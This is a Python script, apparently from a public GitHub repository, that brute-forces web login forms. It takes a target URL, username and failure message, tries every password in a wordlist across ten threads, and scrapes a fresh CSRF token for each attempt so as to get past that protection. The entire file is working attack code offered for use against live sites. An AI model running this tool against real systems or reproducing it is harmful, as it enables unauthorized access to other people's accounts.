######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7      
# If you use the code give me the credit please #
######################################################################################################

print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                   Tanvir Hossain Antu
        https://github.com/Antu7/python-bruteForce


""")


import threading
import requests
import time
import sys
import re
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

class BruteForceCracker:
    def __init__(self, url, username, error_message, username_field="UserName", password_field="Password"):
        self.url = url
        self.username = username
        self.error_message = error_message
        self.username_field = username_field
        self.password_field = password_field
        
        # Display banner without sleep
        print(banner)

    def get_csrf_token(self, session):
        try:
            response = session.get(self.url)
            # Try to extract token using BeautifulSoup
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Look for common CSRF token field names
            csrf_field = soup.find('input', attrs={'name': re.compile(r'csrf|CSRF|token|_token', re.I)})
            if csrf_field and csrf_field.has_attr('value'):
                return csrf_field['name'], csrf_field['value']
            
            # Alternative method: look for meta tags
            meta_token = soup.find('meta', attrs={'name': re.compile(r'csrf|CSRF|token', re.I)})
            if meta_token and meta_token.has_attr('content'):
                return meta_token['name'], meta_token['content']
            
            # Last resort: try to find it in the HTML with regex
            match = re.search(r'name=["\'](_csrf|csrf_token|CSRF|token)["\'] value=["\'](.*?)["\']', response.text)
            if match:
                return match.group(1), match.group(2)
                
            return None, None
        except Exception as e:
            print(f"Error getting CSRF token: {e}")
            return None, None

    def crack(self, password):
        # Create a new session for each attempt to avoid threading issues and ensure fresh cookies
        session = requests.Session()

        # Get a fresh CSRF token for each attempt
        token_name, token_value = self.get_csrf_token(session)
        
        # Prepare the login data
        data_dict = {
            self.username_field: self.username,
            self.password_field: password,
            "Log In": "submit"
        }
        
        # Add CSRF token if found
        if token_name and token_value:
            data_dict[token_name] = token_value
            # print(f"Using CSRF token: {token_name}={token_value[:10]}...")
        
        try:
            # Make the login attempt
            response = session.post(self.url, data=data_dict)

            # Check if login was successful
            if self.error_message in str(response.content) or self.error_message in response.text:
                return False
            else:
                print("\n[+] Success!")
                print("Username: ---> " + self.username)
                print("Password: ---> " + password)
                return True
        except Exception as e:
            print(f"Request failed for {password}: {e}")
            return False

def crack_password_wrapper(password, cracker, counter_lock, counter):
    password = password.strip()
    with counter_lock:
        counter[0] += 1
        count = counter[0]
        if count % 10 == 0:
            print(f"Trying Password: {count} => {password}")

    if cracker.crack(password):
        return True
    return False

def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    
    user_field = input("Enter Username Field Name (default: UserName): ").strip() or "UserName"
    pass_field = input("Enter Password Field Name (default: Password): ").strip() or "Password"

    print("\n[*] Initializing...")
    cracker = BruteForceCracker(url, username, error, user_field, pass_field)

    # Test CSRF detection once
    session = requests.Session()
    token_name, token_value = cracker.get_csrf_token(session)
    
    if token_name and token_value:
        print(f"[+] CSRF token found: {token_name}")
        print("[*] Will attempt to bypass by extracting and including token with each request\n")
    else:
        print("[-] No CSRF token found or using a different protection method\n")
    
    passwords = []
    try:
        with open("passwords.txt", "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print("Error: passwords.txt not found.")
        return

    print(f"Loaded {len(passwords)} passwords.")

    counter = [0]
    counter_lock = threading.Lock()
    found = False

    # Use ThreadPoolExecutor for better concurrency control
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for password in passwords:
            if found: break
            future = executor.submit(crack_password_wrapper, password, cracker, counter_lock, counter)
            futures.append(future)

        for future in futures:
            if future.result():
                found = True
                print("Password found! Stopping other threads...")
                executor.shutdown(wait=False, cancel_futures=True)
                break

if __name__ == '__main__':
    banner = """ 
                       Checking the Server !!        
        [+]█████████████████████████████████████████████████[+]
"""
    # print(banner) # Moved to init to avoid duplication/delay issues
    main()